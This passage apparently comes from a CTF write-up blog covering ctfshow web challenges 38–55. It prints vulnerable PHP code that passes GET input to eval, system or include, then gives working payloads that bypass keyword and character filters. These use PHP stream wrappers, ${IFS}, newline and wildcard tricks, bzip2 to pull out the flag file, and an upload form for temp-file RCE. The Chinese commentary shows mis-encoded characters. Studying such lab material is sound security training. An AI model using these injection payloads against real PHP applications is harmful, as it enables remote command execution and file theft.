<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ç”¨phpä¼ªåè®®:<br>ä¼ å…¥**?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php**<br>å¾—åˆ°ä¸€ä¸²base64åŠ å¯†è¿‡çš„å€¼:<br><em>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7ODUxZjI3ZjgtNWY5Yy00YTZhLTg5NjctNjIwMzUwNDhmZWMwfSI7DQo&#x3D;</em><br>,ç„¶åå¼€å§‹è§£å¯†å¾—åˆ°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;"</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag in flag.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//è¿‡æ»¤flag</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æ·»åŠ åç¼€.phpï¼Œæ— å›æ˜¾</span>
    <span class="token punctuation">&#125;</span>
        
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤äº†flagï¼Œé‡‡ç”¨æ–‡ä»¶åŒ…å«çš„æ–¹å¼ï¼Œåˆ©ç”¨dataä¼ªåè®®ï¼šä¼ å…¥**?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla\g.php");?>**<br>å¾—åˆ°flagã€‚</p>
<h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
        
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤äº†å†’å·ï¼Œä¸èƒ½ç”¨ä¼ªåè®®äº†ï¼Œæ²¡æœ‰è¿‡æ»¤è‹±æ–‡çŠ¶æ€çš„**()** å’Œ**;**å¯ä»¥è¯•è¯•ç”¨æ— å‚å‡½æ•°:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p>
<p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong> ä¸ <strong>highlight_file</strong> å¯ä»¥äº’æ¢ã€‚<br>å¾—åˆ°flagã€‚</p>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<pre><code>&gt;/dev/null 2&gt;&amp;1
&gt;é»˜è®¤æƒ…å†µæ˜¯1ï¼Œä¹Ÿå°±æ˜¯ç­‰åŒäº1&gt;/dev/null 2&gt;&amp;1ã€‚æ„æ€å°±æ˜¯æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°â€œé»‘æ´â€ï¼Œè¿˜æŠŠé”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºéƒ½è¿›äº†â€œé»‘æ´â€ã€‚è¦æƒ³ç»•è¿‡è¿™ä¸ªâ€œé»‘æ´â€œï¼Œéœ€è¦å¾€é‡Œé¢ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œshellä¼šæ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°†ç¬¬äºŒä¸ªå‚æ•°å¸¦å…¥åˆ°é»‘æ´ã€‚
</code></pre>
</blockquote>
<p>æ‰€ä»¥æ„é€  ï¼š<br><code>?c=ls;ls(ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥å†™å¯ä»¥ä¸å†™ï¼Œä½†ä¸€å®šè¦åŠ åˆ†å·ã€‚ä»£è¡¨åˆ†å·å‰é¢æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ã€‚)</code><br>æ¥ç€çœ‹åˆ°flag.phpï¼Œç„¶åæ„é€ <br><code>?c=tac flag.php;</code><br>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/2df7d753a2be42d4b6167d2f62e641a9.png" alt="42"><br>å…³äº<strong>linuxä¸­&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1å’Œ2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</strong>è¯·<a href="https://www.cnblogs.com/kexianting/p/11630085.html">ç‚¹å‡»é“¾æ¥</a></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>ä¸web42ç›¸æ¯”ï¼Œå°±å¤šè¿‡æ»¤äº†åˆ†å·å’Œcatã€‚</p>
<blockquote>
<p>åˆ†å·çš„ä»£æ›¿ï¼š<br>%26  	 %0a  	 ||<br>catçš„ä»£æ›¿å°±å¾ˆå¤šäº†:<br>tac tail nl  sort  uniq	head more lessç­‰</p>
</blockquote>
<p>æ„é€ ï¼š<br><code>?c=tac flag.php%0a</code><br>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/cd8e9c47e22b4d2186c3b65831fd18ed.png" alt="43"></p>
<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p>æ„é€ <code>?c=tac fla\g.php%0a</code><br>flagè¢«è¿‡æ»¤ï¼Œç”¨fla?.phpæˆ–fla*æˆ–fla\g.php<br><img src="https://img-blog.csdnimg.cn/cd533af3fd0546499f6ec5c5ccab36ab.png" alt="44"></p>
<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†</p>
<blockquote>
<p>ç©ºæ ¼çš„ä»£æ›¿ï¼š<br>%09<br>%20<br>$IFS<br>${IFS}<br>$IFS$9<br>&lt;<br>&lt;&gt;</p>
</blockquote>
<p>æ„é€ ï¼š<br><code>?c=tac%09fl\ag.php%26</code><br><img src="https://img-blog.csdnimg.cn/ef07d9f8a7de4bb3a1f66651f7927080.png" alt="45"></p>
<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>æ–°è¿‡æ»¤äº†*$å’Œæ•°å­—<br>ä»ç„¶å¯ä»¥æ„é€ <code>?c=tac%09fl\ag.php%26</code>å…¶ä¸­%09ï¼Œ%26ä¸å—æ•°å­—è¢«è¿‡æ»¤çš„å½±å“ï¼Œå› ä¸ºåœ¨åŠ è½½æ—¶%09ï¼Œ%26ä¼šè¢«è§£ç ä¸ºç©ºæ ¼å’Œåˆ†å·ï¼Œä¹Ÿå°±æ²¡æœ‰äº†æ•°å­—ã€‚</p>
<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>ä»ç„¶å¯ä»¥æ„é€ <code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>ä»ç„¶å¯ä»¥æ„é€ <code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>ä»ç„¶å¯ä»¥æ„é€ <code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>è¿‡æ»¤äº†\x09å’Œ\x26ï¼Œæ˜¯åå…­è¿›åˆ¶ï¼Œç›¸å½“äºè¿‡æ»¤äº†æŠŠ%09å’Œ%26urlè§£ç åçš„\tå’Œ&amp;ã€‚<br>é‚£ä¹ˆç”¨nlæ„é€ <code>?c=nl&lt;&gt;fl\ag.php%0a</code>æŸ¥çœ‹æºç å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/2711a133cca1468d9c6abf47edf4c596.png" alt="50"></p>
<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>ç”¨nlæ„é€ <code>?c=nl&lt;&gt;fl\ag.php%0a</code>æŸ¥çœ‹æºç å¾—åˆ°flagã€‚</p>
<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>è¿‡æ»¤äº†&lt;&gt;ï¼Œæ”¾å¼€äº†$ã€‚<br>æ„é€ <br><img src="https://img-blog.csdnimg.cn/f6af93b9f8184e2fac3ac26887309258.png" alt="51"><br>æ˜¾ç¤ºå‡çš„flagã€‚<br><img src="https://img-blog.csdnimg.cn/d42ab57d32d045f280099f2d39ade197.png" alt="52"></p>
<p>æ„é€ </p>
<p><img src="https://img-blog.csdnimg.cn/5239125221384771978e45ffa48aa32a.png" alt="52"></p>
<p>æ²¡æœ‰flagã€‚<br>åŠ ä¸ªåå¼•å·æ„é€ </p>
<p><img src="https://img-blog.csdnimg.cn/a0f0ec1b687a4c9bb9c58262da2c2893.png" alt="52"><br>å‡çš„flag<br><img src="https://img-blog.csdnimg.cn/84c0438b30b645e3b9aa4f2fe6d86feb.png" alt="52"></p>
<p>æ‰“å¼€æ ¹ç›®å½•æŸ¥çœ‹ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p>
<p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p>
<p>ç­‰ä»·äº<code>?c=ls /;</code>å…¶ä¸­â€œ&#x2F;â€æ˜¯æ ¹ç›®å½•ã€‚è¯´æ˜flagåœ¨æ ¹ç›®å½•ä¸‹<br>ç§»åŠ¨flagåˆ°å§.txtæ–‡ä»¶ä¸­ï¼Œæ„é€ ï¼š<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>æŸ¥çœ‹b.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p>
<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>æŠŠtacè¿‡æ»¤æ‰äº†ï¼Œä½¿ç”¨tacæ—¶ç”¨t\acä¸å°±è¡Œäº†å—ï¼Ÿ<br>æ„é€ ï¼š<code>ls%0a</code><br><img src="https://img-blog.csdnimg.cn/c3df993696314026bf5e3f09c92bfed2.png" alt="53"><br>æ„é€ ï¼š<code>ta\c$&#123;IFS&#125;fl\ag.php%0a</code>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/83fd360699064877aa18112049e00594.png" alt="53"></p>
<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>å¥½å¥‡æ€ª</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//|.*c.*a.*t.*|çš„æ„æ€æ˜¯cat å’Œcatä¹‹é—´æ’å…¥å­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œç›¸å½“äºå¼•å·ç»•è¿‡ç”¨ä¸äº†äº†c""atä¹Ÿä¼šè¢«è¿‡æ»¤</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?c=ls%0a</code>æŸ¥çœ‹ä¸€ä¸‹ï¼Œ<br><img src="https://img-blog.csdnimg.cn/bc99561bcda249aeb4dcd6bfb536e88a.png" alt="54"><br><code>/?c=t&#39;&#39;ac$&#123;IFS&#125;fl??.php%0a</code>æ— å›æ˜¾ã€‚é‚£å°±å°†flag.phpçš„åå­—æ”¹ä¸€ä¸‹ï¼Œ<code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;c.txt</code>æŸ¥çœ‹c.txtå¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/e0c0b3fb362541a494d84e24c336876c.png" alt="54"></p>
<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸‹å¥½äº†ï¼Œè¿‡æ»¤äº†å­—æ¯ï¼Œä½†æ˜¯æ•°å­—æ²¡æœ‰è¿‡æ»¤ï¼Œæ•°å­—ï¼Ÿ64ï¼Ÿç”¨base64åŠ å¯†å†…å®¹ã€‚åŸå†…å®¹ä¸º<code>/bin/base64 flag.php</code>è¿‡æ»¤äº†å­—æ¯ï¼Ÿç”¨ï¼Ÿä»£æ›¿ï¼Œç„¶åä¸ºï¼š<code>/???/????64 ????.???</code><br><img src="https://img-blog.csdnimg.cn/aede99d5d50a4c958806d913e1a910e4.png" alt="55"><br>è§£å¯†åå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/39f6b55ee217431cb0f50b6b5fab570f.png" alt="55"><br> çŸ¥è¯†ç‚¹ï¼š<br> å¯ä»¥åŒ¹é…åˆ°&#x2F;binç›®å½•ä¸‹çš„å‘½ä»¤</p>
<blockquote>
<p>catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰</p>
</blockquote>
<p> <strong>æ–¹æ³•äºŒ</strong></p>
<p>å‚è€ƒçš„wp,æœ‰ç”¨bzip2çš„å‘½ä»¤çš„ã€‚è¯·å‚è€ƒ<a href="https://blog.csdn.net/qq313088385/article/details/114382259">è¿™é‡Œ</a></p>
<blockquote>
<p> å‘½ä»¤åç§°ï¼šbzip2<br> å‘½ä»¤å…¨ç§°ï¼ša block-sorting file compressor<br> æ‰§è¡Œæƒé™ï¼šæ‰€æœ‰ç”¨æˆ·<br> æ‰€åœ¨è·¯å¾„ï¼š&#x2F;usr&#x2F;bin&#x2F;bzip2<br> åŠŸèƒ½æè¿°ï¼šå‹ç¼©æ–‡ä»¶</p>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤å‹ç¼©flag.php ç„¶åè¿›è¡Œä¸‹è½½<br>payloadï¼š?c&#x3D;&#x2F;???&#x2F;???&#x2F;???2 ????.???<br>ä¹Ÿå°±æ˜¯&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php<br>ç„¶åè®¿é—®&#x2F;flag.php.bz2è¿›è¡Œä¸‹è½½è·å¾—flag.php</p>
<p><strong>æ–¹æ³•ä¸‰</strong></p>
<p><a href="https://blog.csdn.net/snowlyzz/article/details/125051503">å‚è€ƒ</a></p>
<p>å‰ææ˜¯ é¢˜ç›®æ²¡æœ‰è¿‡æ»¤ ? &#x2F; . (é—®å·ï¼Œæ–œæ ,ç‚¹)ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p>
<p>ç¼–å†™ æœ¬åœ°æ–‡ä»¶ä¸Šä¼ çš„ç½‘é¡µï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTæ•°æ®åŒ…POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0bb2c3a2-2646-491d-80fa-52c6bee9decc.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯&#x2F;tmp&#x2F;phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚è‡³äºåé¢ä¸ºä»€ä¹ˆè¦åŠ [@-[],æ˜¯ä¸ºäº†åŒ¹é…åˆ°æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—æ¯çš„å¤§å†™</p>
